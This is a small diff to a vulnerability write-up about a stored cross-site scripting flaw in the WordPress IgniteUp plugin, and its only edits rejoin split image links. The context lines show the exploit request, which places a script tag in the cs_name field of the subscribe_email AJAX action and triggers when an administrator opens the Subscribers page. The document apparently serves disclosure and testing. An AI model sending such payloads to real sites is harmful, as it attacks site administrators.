@@ -9,9 +9,7 @@
 
 /wp-admin/admin-ajax.php?action=subscribe_email&cs_email=1@11.coc.com&cs_name=<script>alert(1)</script>
 
-![image](https://github.com/guobaoyou/vul_environment/blob/master/wordpress_igniteup_plugin_xss
-/images/1.jpg)
+![image](https://github.com/guobaoyou/vul_environment/blob/master/wordpress_igniteup_plugin_xss/images/1.jpg)
 
 当管理员查看Subscribers时，触发漏洞。
-![image](https://github.com/guobaoyou/vul_environment/blob/master/wordpress_igniteup_plugin_xss
-/images/2.jpg)
+![image](https://github.com/guobaoyou/vul_environment/blob/master/wordpress_igniteup_plugin_xss/images/2.jpg)
